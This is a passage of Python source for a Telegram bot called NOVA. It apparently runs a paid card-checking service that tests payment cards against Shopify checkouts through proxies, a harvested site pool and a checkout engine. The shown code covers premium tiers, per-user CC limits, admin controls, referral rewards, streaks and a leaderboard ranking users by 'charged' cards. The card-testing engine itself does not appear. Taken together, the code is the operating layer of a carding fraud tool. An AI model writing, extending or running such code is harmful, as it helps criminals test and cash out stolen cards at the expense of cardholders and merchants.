        return await styled_reply(event, pe(f"💎 <code>• /removepremium user_id</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if target in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Cannot remove admin')}</b>"))
    if remove_premium(target):
        await styled_reply(event, pe(f"✅ <b>{bs('Removed')}</b> <code>{target}</code>"))
        try:
            await send_entities(target, pe(f"⚠️ <b>{bs('Premium revoked')}</b>"))
        except Exception:
            pass
    else:
        await styled_reply(event, pe(f"⚠️ <b>{bs('Not premium')}</b>"))


@client.on(events.NewMessage(pattern=r'^[/.]listpremium$'))
async def cmd_listpremium(event):
    if event.sender_id not in ADMIN_ID:
        return
    data = _db.list_premium(200)
    if not data:
        return await styled_reply(event, pe(f"💎 <b>{bs('No premium users')}</b>"))
    now = datetime.now().timestamp()
    lines = []
    for d in data[:50]:
        uid_str = str(d["_id"])
        exp = d.get("plan_expiry")
        cc = d.get("cc_limit", "-")
        if exp:
            try:
                if isinstance(exp, str):
                    exp_dt = datetime.fromisoformat(exp)
                    left = int((exp_dt.timestamp() - now) / 60)
                    if left < 0:
                        lines.append(f"• <code>{uid_str}</code> — ⚠️ Expired")
                        continue
                    h, m = left // 60, left % 60
                    lines.append(f"• <code>{uid_str}</code> — {h}h {m}m · CC {cc}")
                else:
                    lines.append(f"• <code>{uid_str}</code> — CC {cc}")
            except Exception:
                lines.append(f"• <code>{uid_str}</code> — CC {cc}")
    await styled_reply(event, pe(
        f"👑 <b>{bs('Premium')}</b> (<code>{len(data)}</code>)\n"
        f"{SEP}\n" + "\n".join(lines)))


@client.on(events.NewMessage(pattern=r'^[/.]setfreelimit\s+'))
async def cmd_setfreelimit(event):
    global FREE_DAILY_LIMIT, FREE_COOLDOWN_SEC
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Usage')}</b>\n"
            f"<code>• /setfreelimit daily [cooldown]</code>\n{SEP}\n"
            f"Current: <code>{FREE_DAILY_LIMIT}</code> / day · cooldown <code>{FREE_COOLDOWN_SEC}s</code>"))
    try:
        new_daily = int(parts[1])
        new_cool = int(parts[2]) if len(parts) > 2 else FREE_COOLDOWN_SEC
    except ValueError:
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid numbers')}</b>"))
    FREE_DAILY_LIMIT = new_daily
    FREE_COOLDOWN_SEC = new_cool
    await styled_reply(event, pe(
        f"✅ <b>{bs('Free limits updated')}</b>\n"
        f"📋 Daily: <code>{FREE_DAILY_LIMIT}</code>\n"
        f"⏱ Cooldown: <code>{FREE_COOLDOWN_SEC}s</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getlimits$'))
async def cmd_getlimits(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, pe(
        f"📊 <b>{bs('Bot limits')}</b>\n{SEP}\n"
        f"🆓 Free daily: <code>{FREE_DAILY_LIMIT}</code>\n"
        f"⏱ Free cooldown: <code>{FREE_COOLDOWN_SEC}s</code>\n"
        f"💎 Premium default CC: <code>{DEFAULT_KEY_CC_LIMIT}</code>\n"
        f"🥇 Admin mass cap: <code>{MASS_HARD_CAP_ADMIN}</code>\n"
        f"🥈 Premium mass cap: <code>{MASS_HARD_CAP_PREMIUM}</code>\n"
        f"🎯 Price filter: <code>${get_min_price():.2f}–${get_threshold():.2f}</code>\n"
        f"📁 Max proxies/user: <code>{MAX_PROXIES_PER_USER}</code>\n"
        f"⚙️ Workers/user: sp<code>{SP_PER_USER_WORKERS}</code> msp<code>{MSP_PER_USER_WORKERS}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]setuserlimit\s+'))
async def cmd_setuserlimit(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 3:
        return await styled_reply(event, pe(
            f"💎 <code>• /setuserlimit user_id daily_checks</code>\n"
            f"Use <code>0</code> {bs('for unlimited')}"))
    try:
        target = int(parts[1])
        limit = int(parts[2])
    except ValueError:
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid')}</b>"))
    _db.set_user_limit(target, limit)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Limit set')}</b>\n"
        f"👤 <code>{target}</code>\n"
        f"📋 <code>{limit if limit else 'unlimited'}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]addadmin\s+'))
async def cmd_addadmin(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /addadmin user_id</code>"))
    try:
        t = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if t in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Already admin')}</b>"))
    ADMIN_ID.append(t)
    _save_admins()
    await styled_reply(event, pe(f"✅ <b>{bs('Admin added')}</b> <code>{t}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]removeadmin\s+'))
async def cmd_removeadmin(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /removeadmin user_id</code>"))
    try:
        t = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if t not in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not an admin')}</b>"))
    ADMIN_ID.remove(t)
    _save_admins()
    await styled_reply(event, pe(f"✅ <b>{bs('Admin removed')}</b> <code>{t}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]toggle$'))
async def cmd_toggle(event):
    if event.sender_id not in ADMIN_ID:
        return
    cur = get_maintenance()
    set_maintenance(not cur)
    await styled_reply(event, pe(f"💎 {bs('Maintenance')}: {'ON' if not cur else 'OFF'}"))


@client.on(events.NewMessage(pattern=r'^[/.]ping$'))
async def cmd_ping(event):
    t = time.time()
    m = await styled_reply(event, pe("🏓 ..."))
    if m:
        try:
            await m.edit(pe(f"🏓 <b>{bs('Pong')}</b> <code>{(time.time()-t)*1000:.1f}ms</code>"),
                         parse_mode='html')
        except Exception:
            pass


@client.on(events.NewMessage(pattern=r'^[/.]status$'))
async def cmd_status(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, build_status_text())


@client.on(events.NewMessage(pattern=r'^[/.]api$'))
async def cmd_api(event):
    if event.sender_id not in ADMIN_ID:
        return
    stats = _engine_ledger_stats()
    db_stats = _db.stats()
    await styled_reply(event, pe(
        f"🔌 <b>{bs('Stack')}</b>\n{SEP}\n"
        f"✅ {bs('Engine')}: <code>checkout_engine.py (curl_cffi)</code>\n"
        f"✅ {bs('Harvester')}: <code>site_fetcher.py</code>\n"
        f"✅ {bs('Database')}: <code>MongoDB</code>\n"
        f"📦 {bs('Pool size')}: <code>{stats.get('cached', 0)}</code>\n"
        f"👑 {bs('Admins loaded')}: <code>{len(ADMIN_ID)}</code>\n"
        f"👥 {bs('DB users')}: <code>{db_stats.get('users_total', 0)}</code>\n"
        f"💎 {bs('DB premium')}: <code>{db_stats.get('users_premium', 0)}</code>\n"
        f"📊 {bs('DB checks')}: <code>{db_stats.get('checks_total', 0)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]version$'))
async def cmd_version(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, pe(
        f"🤖 <b>{bs('Bot Version')}</b>\n{SEP}\n"
        f"📦 Version: <code>v9.4.0 (MongoDB)</code>\n"
        f"🔧 API mode: <code>API-LESS</code>\n"
        f"⚙️ Engine: <code>checkout_engine.py (curl_cffi)</code>\n"
        f"⚙️ Harvester: <code>site_fetcher.py</code>\n"
        f"💾 Database: <code>MongoDB / nova</code>\n"
        f"🏦 BIN: <code>antipublic + binlist fallback</code>\n"
        f"🔌 Proxy: <code>strict (ipify + TLS)</code>\n"
        f"⏱ Timeout: <code>{SHOPIFY_SINGLE_TIMEOUT}s</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]stats$'))
async def cmd_stats(event):
    if event.sender_id not in ADMIN_ID:
        return
    rank = load_rank()
    total_charged = sum(int(v) for v in rank.values()) if rank else 0
    refs = load_referrals()
    total_refs = sum(len(u.get("rewarded", [])) for u in refs["users"].values())
    snap = _site_fetcher.snapshot()
    db_stats = _db.stats()
    await styled_reply(event, pe(
        f"📊 <b>{bs('Stats')}</b>\n{SEP}\n"
        f"👑 Admins: <code>{len(ADMIN_ID)}</code>\n"
        f"💎 Premium: <code>{db_stats.get('users_premium', 0)}</code>\n"
        f"🌐 Site pool: <code>{snap.get('count', 0)}</code>\n"
        f"🔑 Keys: <code>{db_stats.get('keys_total', 0)}</code>\n"
        f"💳 Total charged: <code>{total_charged}</code>\n"
        f"🎁 Total referrals: <code>{total_refs}</code>\n"
        f"📊 Checks logged: <code>{db_stats.get('checks_total', 0)}</code>\n"
        f"🎯 Price filter: <code>${get_min_price():.2f}–${get_threshold():.2f}</code>\n"
        f"🤖 Maintenance: {'ON' if get_maintenance() else 'OFF'}"))


@client.on(events.NewMessage(pattern=r'^[/.]diag$'))
async def cmd_diag(event):
    if event.sender_id not in ADMIN_ID:
        return
    ds = _db.stats()
    snap = _site_fetcher.snapshot()
    es = _engine_ledger_stats()
    lines = [f"🔍 <b>{bs('Full Diagnostic')}</b>", SEP]
    lines.append(f"📦 {bs('Version')}: <code>v9.4.0 (mongo)</code>")
    lines.append(f"⚙️ {bs('Engine')}: <code>checkout_engine.py (curl_cffi)</code>")
    lines.append(f"⚙️ {bs('Harvester')}: <code>site_fetcher.py</code>")
    lines.append(f"💾 {bs('Database')}: <code>MongoDB</code>")
    lines.append(f"📦 {bs('Variant cache')}: <code>{es.get('cached', 0)}</code>")
    lines.append(f"🔒 {bs('Force-join')}: <code>{len(FORCE_JOIN_CHATS)}</code>")
    lines.append(f"👑 {bs('Admins')}: <code>{ADMIN_ID}</code>")
    lines.append(SEP)
    lines.append(f"🌐 {bs('Site pool')}: <code>{snap.get('count', 0)}</code>")
    lines.append(f"🚫 {bs('Captcha pool')}: <code>{snap.get('captcha_count', 0)}</code>")
    lines.append(f"🔌 {bs('Your proxies')}: <code>{len(load_user_proxies(event.sender_id))}</code>")
    lines.append(SEP)
    lines.append(f"👥 {bs('DB users')}: <code>{ds.get('users_total', 0)}</code>")
    lines.append(f"💎 {bs('DB premium')}: <code>{ds.get('users_premium', 0)}</code>")
    lines.append(f"🔑 {bs('DB keys')}: <code>{ds.get('keys_total', 0)}</code>")
    lines.append(f"📊 {bs('DB checks')}: <code>{ds.get('checks_total', 0)}</code>")
    lines.append(SEP)
    lines.append(f"⏱ {bs('Timeout')}: <code>{SHOPIFY_SINGLE_TIMEOUT}s</code>")
    await styled_reply(event, pe("\n".join(lines)))


@client.on(events.NewMessage(pattern=r'^[/.]all\s+'))
async def cmd_all(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /all message</code>"))
    msg = parts[1]
    data = _db.list_premium(10000)
    sent = 0
    for d in data:
        try:
            await send_entities(int(d["_id"]), pe(msg))
            sent += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await styled_reply(event, pe(f"✅ {bs('Sent to')} <code>{sent}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]resetledger$'))
async def cmd_resetledger(event):
    if event.sender_id not in ADMIN_ID:
        return
    _engine_ledger_clear()
    await styled_reply(event, pe(f"✅ <b>{bs('Variant cache cleared')}</b>"))


# ---------- Referral / streak / rank ----------
@client.on(events.NewMessage(pattern=r'^[/.]ref(?:eral)?$'))
async def cmd_ref(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    s = referral_stats(uid)
    code = s["code"]
    try:
        me = await client_instance.get_me()
        bot_user = me.username or "YourBot"
    except Exception:
        bot_user = "YourBot"
    link = f"https://t.me/{bot_user}?start=ref_{code}"
    every = REFERRAL_MILESTONE_EVERY
    hours = REFERRAL_MILESTONE_HOURS
    cc = REFERRAL_MILESTONE_CC_LIMIT
    confirmed = s["confirmed"]
    in_cycle = confirmed % every
    bar = "▰" * in_cycle + "▱" * (every - in_cycle)
    text = pe(f"""🎁 <b>{bs('Referral Program')}</b>
{SEP}
🔗 <b>{bs('Your Link')}</b>
<code>{link}</code>

🔑 <b>{bs('Code')}</b>: <code>{code}</code>
{SEP}
📊 <b>{bs('Your Stats')}</b>
┣ ✅ {bs('Confirmed')}: <code>{confirmed}</code>
┣ ⏳ {bs('Pending')}: <code>{s['pending']}</code>
┣ 🏅 {bs('Milestones')}: <code>{s['milestones_paid']}</code>
┗ 💰 {bs('Total Hours')}: <code>{s['total_hours']}h</code>

📈 <b>{bs('Progress')}</b>
<code>{bar}</code>  <b>{in_cycle}/{every}</b>
🎯 {bs('Next in')}: <code>{s['next_milestone_in']}</code> {bs('more')}
{SEP}
💎 <b>{bs('Reward every')} {every} {bs('referrals')}</b>
┣ ⏰ <code>+{hours}h Premium</code>
┗ 💳 <code>+{cc} CC limit</code>
{SEP}
💡 {bs('Friend must complete')} <code>{REFERRAL_MIN_CHECKS}</code> {bs('check')}""")
    share_url = f"https://t.me/share/url?url={link}&text=Join%20NOVA!"
    buttons = [
        [pbtn(bs("📤 Share Link"), url=share_url, style="success", icon="📤")],
        [pbtn(bs("👥 My Referrals"), data="ref_myrefs", style="primary", icon="👥"),
         pbtn(bs("🏆 Leaderboard"), data="ref_leaderboard", style="primary", icon="🏆")],
        [pbtn(bs("🔙 Menu"), data="main_menu", style="danger", icon="🔙")],
    ]
    await styled_reply(event, text, buttons=buttons)


@client.on(events.NewMessage(pattern=r'^[/.](refleaderboard|topref)$'))
async def cmd_topref(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    data = load_referrals()
    rows = []
    for uid_s, u in data["users"].items():
        cnt = len(u.get("rewarded", []))
        if cnt > 0:
            rows.append((uid_s, cnt, int(u.get("total_hours_earned", 0))))
    rows.sort(key=lambda x: x[1], reverse=True)
    rows = rows[:10]
    if not rows:
        return await styled_reply(event, pe(
            f"🏆 <b>{bs('Top Referrers')}</b>\n{SEP}\n"
            f"<i>{bs('No referrers yet')}</i>\n{SEP}\n"
            f"💡 {bs('Be the first! Use')} <code>• /ref</code>"))
    medals = ["🥇", "🥈", "🥉"]
    lines = []
    for i, (uid_s, cnt, hrs) in enumerate(rows):
        try:
            ent = await client_instance.get_entity(int(uid_s))
            name = ent.first_name or uid_s
        except Exception:
            name = uid_s
        medal = medals[i] if i < 3 else f"<b>{i+1}.</b>"
        lines.append(f"{medal} <b>{name}</b> — <code>{cnt}</code> refs · <code>{hrs}h</code>")
    text = pe(f"🏆 <b>{bs('Top Referrers')}</b>\n{SEP}\n" + "\n".join(lines) + f"""
{SEP}
🎁 {bs('Every')} <code>{REFERRAL_MILESTONE_EVERY}</code> refs → <code>+{REFERRAL_MILESTONE_HOURS}h +{REFERRAL_MILESTONE_CC_LIMIT} CC</code>""")
    buttons = [
        [pbtn(bs("🎁 My Referrals"), data="ref_menu", style="success", icon="🎁")],
        [pbtn(bs("🔙 Menu"), data="main_menu", style="danger", icon="🔙")],
    ]
    await styled_reply(event, text, buttons=buttons)


@client.on(events.NewMessage(pattern=r'^[/.]refstats$'))
async def cmd_refstats(event):
    if event.sender_id not in ADMIN_ID:
        return
    data = load_referrals()
    total_users = len(data["users"])
    total_confirmed = sum(len(u.get("rewarded", [])) for u in data["users"].values())
    total_pending = sum(len(u.get("pending", [])) for u in data["users"].values())
    total_hours = sum(int(u.get("total_hours_earned", 0)) for u in data["users"].values())
    total_milestones = sum(int(u.get("milestones_paid", 0)) for u in data["users"].values())
    await styled_reply(event, pe(
        f"📊 <b>{bs('Referral Stats')}</b>\n{SEP}\n"
        f"👥 {bs('Users')}: <code>{total_users}</code>\n"
        f"✅ {bs('Confirmed')}: <code>{total_confirmed}</code>\n"
        f"⏳ {bs('Pending')}: <code>{total_pending}</code>\n"
        f"🏅 {bs('Milestones paid')}: <code>{total_milestones}</code>\n"
        f"💰 {bs('Total hours')}: <code>{total_hours}h</code>\n{SEP}\n"
        f"🎁 {bs('Every')} <code>{REFERRAL_MILESTONE_EVERY}</code> refs → "
        f"<code>+{REFERRAL_MILESTONE_HOURS}h +{REFERRAL_MILESTONE_CC_LIMIT} CC</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]refreset\s+'))
async def cmd_refreset(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /refreset user_id</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid')}</b>"))
    if reset_referrals_for_user(target):
        await styled_reply(event, pe(f"✅ <b>{bs('Reset')}</b>\n👤 <code>{target}</code>"))
    else:
        await styled_reply(event, pe(f"⚠️ <b>{bs('No data')}</b>"))


@client.on(events.NewMessage(pattern=r'^[/.]refgive\s+'))
async def cmd_refgive(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /refgive user_id</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid')}</b>"))
    _grant_milestone(target, REFERRAL_MILESTONE_HOURS, REFERRAL_MILESTONE_CC_LIMIT)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Milestone granted')}</b>\n"
        f"👤 <code>{target}</code>\n"
        f"🎁 +{REFERRAL_MILESTONE_HOURS}h +{REFERRAL_MILESTONE_CC_LIMIT} CC"))


@client.on(events.NewMessage(pattern=r'^[/.]streak$'))
async def cmd_streak(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    s = get_streak(uid)
    cur = s["current"]
    best = s["best"]
    upcoming = [d for d in sorted(STREAK_MILESTONES.keys()) if d > cur]
    if upcoming:
        target = upcoming[0]
        prev = max([d for d in STREAK_MILESTONES if d <= cur] + [0])
        span = target - prev
        step = cur - prev
        bar = "▰" * max(0, step) + "▱" * max(0, span - step)
        next_str = f"{bs('Next at')} <code>{target}</code> {bs('days')} (<code>{span - step}</code> {bs('left')})"
    else:
        bar = "▰" * 10
        next_str = f"<i>{bs('All milestones reached')}</i>"
    text = pe(f"""🔥 <b>{bs('Daily Streak')}</b>
{SEP}
📅 <b>{bs('Current')}</b>: <code>{cur}</code> {bs('days')}
🏆 <b>{bs('Best')}</b>: <code>{best}</code> {bs('days')}
✅ <b>{bs('Total Checks')}</b>: <code>{s['total_checks']}</code>

{bar}
{next_str}
{SEP}
🎁 <b>{bs('Milestones')}</b>
""" + "\n".join(
        f"┣ {bs('Day')} <code>{d}</code> → <code>+{h}h</code>"
        for d, h in sorted(STREAK_MILESTONES.items())
    ) + f"""
{SEP}
💡 {bs('Run')} <code>• /sh</code> {bs('daily to keep the streak alive')}""")
    buttons = [
        [pbtn(bs("📊 My Stats"), data="me_menu", style="primary", icon="📊")],
        [pbtn(bs("🔙 Menu"), data="main_menu", style="danger", icon="🔙")],
    ]
    await styled_reply(event, text, buttons=buttons)


@client.on(events.NewMessage(pattern=r'^[/.]me$'))
async def cmd_me(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"
    charged_total = _db.get_charged_count(uid)
    rank_all = _db.rank_all()
    position = "—"
    for i, (rid, _) in enumerate(rank_all, 1):
        if rid == uid:
            position = f"#{i}"
            break
    s = get_streak(uid)
    if uid in ADMIN_ID:
        tier = f"👑 {bs('Admin')}"
        exp_str = "∞"
        cc_limit = 100000
    elif is_premium(uid):
        tier = f"💎 {bs('Premium')}"
        cc_limit = _db.get_cc_limit(uid)
        doc = None
        try:
            c = _db._c("users")
            doc = c.find_one({"_id": uid}) if c is not None else None
        except Exception:
            doc = None
        exp = doc.get("plan_expiry") if doc else None
        if exp:
            try:
                if isinstance(exp, str):
                    exp_dt = datetime.fromisoformat(exp)
                    left = max(0, int((exp_dt.timestamp() - time.time()) / 60))
                    h, m = left // 60, left % 60
                    exp_str = f"{h}h {m:02d}m"
                else:
                    exp_str = "∞"
            except Exception:
                exp_str = "?"
        else:
            exp_str = "∞"
    else:
        tier = f"🆓 {bs('Free')}"
        exp_str = "—"
        cc_limit = 0
        used = get_free_usage(uid)
        exp_str = f"{used}/{FREE_DAILY_LIMIT} " + bs("today")
    try:
        rs = referral_stats(uid)
        ref_conf = rs.get("confirmed", 0)
        ref_pend = rs.get("pending", 0)
        ref_hours = rs.get("total_hours", 0)
        ref_mst = rs.get("milestones_paid", 0)
    except Exception:
        ref_conf = ref_pend = ref_hours = ref_mst = 0
    try:
        p_count = len(load_user_proxies(uid))
    except Exception:
        p_count = 0
    text = pe(f"""📊 <b>{bs('My Stats')}</b>
{SEP}
👤 <b>{name}</b> (@{username})
🆔 <code>{uid}</code>
🎖️ {bs('Tier')}: {tier}
⏰ {bs('Expires')}: <code>{exp_str}</code>
💳 {bs('CC Limit')}: <code>{cc_limit}</code>
{SEP}
🔥 {bs('Streak')}: <code>{s['current']}</code> (best <code>{s['best']}</code>)
💳 {bs('Charged Total')}: <code>{charged_total}</code>
🥇 {bs('Rank')}: <code>{position}</code>
{SEP}
👥 {bs('Referrals')}: <code>{ref_conf}</code> (⏳ <code>{ref_pend}</code>)
🏅 {bs('Milestones')}: <code>{ref_mst}</code>
💰 {bs('Referral Hours')}: <code>{ref_hours}h</code>
{SEP}
🔌 {bs('Proxies')}: <code>{p_count}</code>""")
    buttons = [
        [pbtn(bs("🔥 Streak"), data="streak_menu", style="success", icon="🔥"),
         pbtn(bs("🎁 Referrals"), data="ref_menu", style="success", icon="🎁")],
        [pbtn(bs("🏆 Leaderboard"), data="rank_menu", style="primary", icon="🏆")],
        [pbtn(bs("🔙 Menu"), data="main_menu", style="danger", icon="🔙")],
    ]
    await styled_reply(event, text, buttons=buttons)


@client.on(events.NewMessage(pattern=r'^[/.]rank$'))
async def cmd_rank(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    top = _db.rank_all()[:10]
    if not top:
        return await styled_reply(event, pe(f"💎 {bs('No charged cards yet')}"))
    medals = ["🥇", "🥈", "🥉"]
    lines = []
    for i, (uid_int, count) in enumerate(top):
        try:
            ent = await client_instance.get_entity(int(uid_int))
            name = ent.first_name or str(uid_int)
        except Exception:
            name = str(uid_int)
        medal = medals[i] if i < 3 else f"<b>{i+1}.</b>"
        lines.append(f"{medal} <b>{name}</b> — <code>{count}</code>")
    await styled_reply(event, pe(f"🏆 <b>{bs('Top 10')}</b>\n{SEP}\n" + "\n".join(lines)))


@client.on(events.NewMessage(pattern=r'^[/.]fb$'))
async def cmd_fb(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Premium Only')}</b>\n{SEP}\n"
            f"💎 {bs('Only premium users can use')} <code>• /fb</code>"))
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 {bs('Reply to a media message with')} <code>• /fb</code>"))
    reply = await event.get_reply_message()
    if not (reply.media or reply.photo or reply.document or reply.video):
        return await styled_reply(event, pe(f"💎 {bs('That message has no media to forward.')}"))
    try:
        await client_instance.forward_messages(GROUP_CHAT_ID, reply)
        await styled_reply(event, pe(f"✅ {bs('Forwarded to group.')}"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


# ---------- Video commands ----------
@client.on(events.NewMessage(pattern=r'^[/.]setwelcomevideo$'))
async def cmd_setwelcomevideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a video')}"))
    reply = await event.get_reply_message()
    if not (reply.video or reply.document):
        return await styled_reply(event, pe(f"💎 {bs('Not a video')}"))
    path = os.path.join(VIDEO_DIR, "welcome.mp4")
    try:
        await client_instance.download_media(reply, path)
        try: os.remove(WELCOME_FILE_ID_FILE)
        except Exception: pass
        await styled_reply(event, pe(f"✅ {bs('Welcome video set')} (cache cleared)"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]addhitvideo$'))
async def cmd_addhitvideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a video')}"))
    reply = await event.get_reply_message()
    if not (reply.video or reply.document):
        return await styled_reply(event, pe(f"💎 {bs('Not a video')}"))
    fname = f"hit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
    path = os.path.join(VIDEO_DIR, fname)
    try:
        await client_instance.download_media(reply, path)
        await styled_reply(event, pe(f"✅ {bs('Added')} <code>{fname}</code>"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]listhitvideos$'))
async def cmd_listhitvideos(event):
    if event.sender_id not in ADMIN_ID:
        return
    vids = get_hit_videos()
    if not vids:
        return await styled_reply(event, pe(f"💎 {bs('No hit videos')}"))
    lines = [f"{i}. <code>{os.path.basename(v)}</code>" for i, v in enumerate(vids, 1)]
    await styled_reply(event, pe(
        f"🎬 <b>{bs('Hit videos')}</b> ({len(vids)})\n{SEP}\n" + "\n".join(lines)))


@client.on(events.NewMessage(pattern=r'^[/.]removehitvideo\s+'))
async def cmd_removehitvideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /removehitvideo 1</code>"))
    try:
        idx = int(parts[1]) - 1
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid')}</b>"))
    vids = get_hit_videos()
    if idx < 0 or idx >= len(vids):
        return await styled_reply(event, pe(f"💎 <b>{bs('Out of range')}</b>"))
    try:
        target = os.path.basename(vids[idx])
        os.remove(vids[idx])
        await styled_reply(event, pe(f"✅ {bs('Removed')} <code>{target}</code>"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]hitvideo$'))
async def cmd_hitvideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    vids = get_hit_videos()
    if not vids:
        return await styled_reply(event, pe(f"💎 {bs('No hit videos')}"))
    try:
        await send_file_entities(event.chat_id, random.choice(vids),
            pe(f"🎬 {bs('Sample')}"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


# ---------- Menus ----------
def main_menu_buttons(uid=None):
    buttons = [
        [pbtn(bs("🔓 Gates"), data="gates_menu", style="success", icon="🔓"),
         pbtn(bs("🔌 Proxy"), data="proxy_menu", style="primary", icon="🔌")],
        [pbtn(bs("💎 Plans"), data="plans_pricing", style="success", icon="💎"),
         pbtn(bs("🎁 Referrals"), data="ref_menu", style="success", icon="🎁")],
        [pbtn(bs("🏆 Rank"), data="rank_menu", style="primary", icon="🏆"),
         pbtn(bs("📩 Support"),
              url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
              style="primary", icon="📩")],
        [pbtn(bs("❌ Close"), data="close_menu", style="danger", icon="❌")],
    ]
    if uid and uid in ADMIN_ID:
        buttons.append([pbtn(bs("👑 Admin Panel"), data="admin_panel",
                             style="success", icon="👑")])
    return buttons


@client.on(events.NewMessage(pattern=r'^[/.]start(?:\s+(.+))?$'))
async def cmd_start(event):
    payload = (event.pattern_match.group(1) or '').strip()
    if payload.startswith('ref_'):
        ref_code = payload[4:].strip()
        try:
            if attach_referral(event.sender_id, ref_code):
                await styled_reply(event, pe(
                    f"🎁 <b>{bs('Referral Applied!')}</b>\n{SEP}\n"
                    f"✅ {bs('Joined via friend invite')}\n"
                    f"💎 {bs('Complete')} <code>{REFERRAL_MIN_CHECKS}</code> "
                    f"{bs('check to unlock bonus')}"))
        except Exception as e:
            log_system("REFERRAL", f"attach failed: {e}", "error")
    maint, joined = await asyncio.gather(
        check_maintenance(event),
        force_join_check(event),
        return_exceptions=True,
    )
    if maint is True or joined is False:
        return
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or "User"
    except Exception:
        username = "User"
    if uid in ADMIN_ID:
        status_text = f"👑 {bs('Admin')}"
    elif is_premium(uid):
        status_text = f"💎 {bs('Premium')}"
    else:
        status_text = f"🆓 {bs('Free')}"
    limit_text = bs("Unlimited") if (is_premium(uid) or uid in ADMIN_ID) else "N/A cards/file"
    text = pe(f"""{SEP}
    ✨ {bs('Welcome to NOVA')} ✨
{SEP}
👤 {bs('User')}: @{username}
🆔 {bs('ID')}: <code>{uid}</code>
📊 {bs('Status')}: {status_text}
🎯 {bs('Limit')}: {limit_text}
{SEP}
🔥 {bs('Fast・Accurate・Zero Errors')} 🔥
📌 {bs('Use the buttons below to get started.')}
{SEP}""")
    buttons = main_menu_buttons(uid)
    cached_fid = get_welcome_file_id()
    text_clean, wents = build_entities(text)
    if cached_fid:
        try:
            await client_instance.send_file(
                event.chat_id, cached_fid,
                caption=text_clean, formatting_entities=wents,
